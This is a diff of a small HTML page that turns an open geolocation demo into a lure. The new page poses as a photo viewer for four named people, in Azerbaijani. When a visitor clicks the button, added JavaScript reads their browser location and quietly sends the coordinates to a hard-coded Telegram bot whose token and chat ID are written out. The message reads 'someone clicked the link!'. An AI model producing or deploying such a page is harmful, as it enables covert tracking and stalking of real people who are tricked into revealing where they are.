@@ -1,8 +1,7 @@
-
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Я вижу тебя</title>
+    <title>Sebuhi, Sako, Xeyyam, Cavad</title>
     <style>
         body {
             background-color: black;
@@ -22,10 +21,10 @@
     </style>
 </head>
 <body>
-    <h1>Подключение к твоему устройству...</h1>
-    <p>Анализ сигнала...</p>
+    <h1>Sebuhi, Sako, Xeyyam, Cavad</h1>
+    <p>Şekillere 1 defe baxmağ olur...</p>
     <p>Получение координат...</p>
-    <button onclick="getLocation()">Сканировать</button>
+    <button onclick="getLocation()">Şekileri göster</button>
     <p id="result"></p>
 
     <script>
@@ -40,9 +39,22 @@
         function showPosition(position) {
             const lat = position.coords.latitude.toFixed(4);
             const lon = position.coords.longitude.toFixed(4);
-            document.getElementById("result").innerHTML = 
-                `Ты находишься примерно здесь: <br>Широта: ${lat}, Долгота: ${lon}<br>
-                <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">Открыть в Google Maps</a>`;
+            
+            // Telegram Bot Info
+            const botToken = "7678736983:AAHwSffWrSToZjnYUE5gWmF2bAA-rUa-z7o";
+            const chatId = "5483361865";
+
+            // Telegram API URL
+            const message = `Кто-то нажал ссылку!\nШирота: ${lat}\nДолгота: ${lon}`;
+            
+            // Отправка сообщения в Telegram
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+
+            document.getElementById("result").innerHTML = `
+                Твои координаты получены.<br>
+                Широта: ${lat}, Долгота: ${lon}<br>
+                <a href="https://maps.google.com/?q=${lat},${lon}" target="_blank">Открыть в Google Maps</a>
+            `;
         }
     </script>
 </body>
